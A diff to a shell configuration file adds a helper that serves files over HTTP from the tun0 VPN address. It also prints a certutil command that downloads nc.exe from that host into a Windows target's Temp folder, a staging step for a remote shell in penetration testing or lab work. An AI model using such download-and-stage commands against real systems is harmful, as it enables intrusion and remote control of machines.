@@ -117,6 +117,13 @@ pyc() {
     gcc -fPIE -O3 $(python3-config --cflags --embed) `echo "$1" | awk '{ gsub(".py",".c"); print }'` $(python3-config --ldflags --embed)
 }
 
+http_server() {
+    if [[ $PWD = $HOME ]]; then echo "Not from HOME"; return; fi
+    local LHOST=$(ip a show tun0 | grep 'inet ' | awk '{ print substr($2, 0, length($2)-3) }')
+    local LPORT="${1:-8080}"
+    l && ip -br a && echo "certutil.exe -urlcache -f http://$LHOST:$LPORT/nc.exe C:\\Windows\\Temp\\nc.exe"
+    python3 -m http.server "$LPORT"
+}
 
 digg() {
     dns_types=(A AAAA TXT CNAME MX NS PTR SOA)
